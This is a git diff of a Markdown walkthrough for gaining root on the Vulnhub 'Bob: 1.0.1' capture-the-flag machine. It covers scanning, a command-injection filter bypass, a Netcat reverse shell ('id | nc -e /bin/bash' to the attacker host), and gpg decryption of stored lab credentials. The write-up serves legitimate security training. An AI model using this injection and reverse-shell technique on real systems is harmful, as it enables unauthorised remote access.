@@ -8,27 +8,26 @@
     }
 </style>
 
-# Gain root privileges on Bob: 1.0.1 virtual machine
+# Gain root privileges on Bob: 1.0.1 virtual machine with unsecured store credentials
 
-Gaining root privileges on a web server with the ultimate goal of capturing a flag is the aim of this demo. 
+Gaining root privileges on a web server with the ultimate goal of capturing a flag is the aim of this demo.
 The target is a vulnerable web server running within the [Bob: 1.0.1](https://www.vulnhub.com/entry/bob-101,226/) virtual machine, publicly available on [Vulnhub](www.vulnhub.com) platform. 
 
 The walkthrough [Hack The Bob: 1.0.1](https://www.hackingarticles.in/hack-the-bob-1-0-1-vm-ctf-challenge/) is the baseline of the following report.
+
+## Threat Model
+
+The threat model of this demo is that the attacker (a Kali Linux virtual machine) is physically present in the same local network of the target and has the ability to communicate with it through TCP connections.  
+Initial access is obtained by exploiting a web application vulnerability via browser
+
 
 ## Content
 
 - [**Discovery**](#discovery) &rightarrow; network scanning and services enumeration
 - [**Initial Access**](#initial-access) &rightarrow; exploit RCE vulnerability on web application
-- [**Execution**](#execution) &rightarrow; establish reverse shell using Netcat
-- [**Credential Access**](#credential-access) &rightarrow; abuse of legitimate credentials stored insecurely in the machine
-- [**Privilege Escalation**](#privilege-escalation) &rightarrow; abuse of valid accounts with high privileges
-
-## Threat Model
-
-The threat model of the demo is that the attacker is physically present in the same local network of the target and has the ability to communicate with it opening a TCP connection.
-Initial access is obtained by Exploit Public-Facing Application technique
-The vulnerability will be exploited via browser and used to obtain initial access 
-
+- [**Execution**](#execution) &rightarrow; spawn target's remote shell on Kali vm using Netcat
+- [**Credential Access**](#credential-access) &rightarrow; use of legitimate credentials stored insecurely in the machine
+- [**Privilege Escalation**](#privilege-escalation) &rightarrow; abuse of high privileges valid accounts
 
 ### Discovery
 The initial step involves scanning the local network to locate the IP address of the target machine.
@@ -87,8 +86,7 @@ The specific filter circumvention is based on
 - operand `|`, called Pipe, simply takes as input of the second command the output of the first, but since `ls` doesn't do anything with its input the result of `id | ls` is just the output of `ls`.
 
 ### Execution
-Since the circumvention has been found is time now to expoit it for establishing a connection through the web shell and the Kali machine. This is done using Netcat which is a command line tool for remote communication over TCP connections
-
+Since the circumvention has been found is time now to exploit it for establishing a connection through the web shell and the Kali machine. This is done using Netcat which is a command line tool for remote communication over TCP connections
 - on Kali side the command `nc -lvp 6000` is ran, so the Kali machine is now listening on port 6000 for connection requests: this is the server side of the future TCP connection
 - on the web interface of the target, command `id | nc -e /bin/bash 10.0.2.6 6000` is ran: this will be the client side of the TCP connection.
 
@@ -126,7 +124,7 @@ gpg --batch –passphrase HARPOCRATES -d login.txt.gpg
 Decryption succeeded thanks to the right passphrase.
 Having the file in clear it is possible to read Bob's password which is 'b0bcat_'.
 
-All the steps mentioned are shown in the following screenshot. 
+All the steps mentioned are shown in the following screenshot.
 
 ![6](images/elliot.png)
 
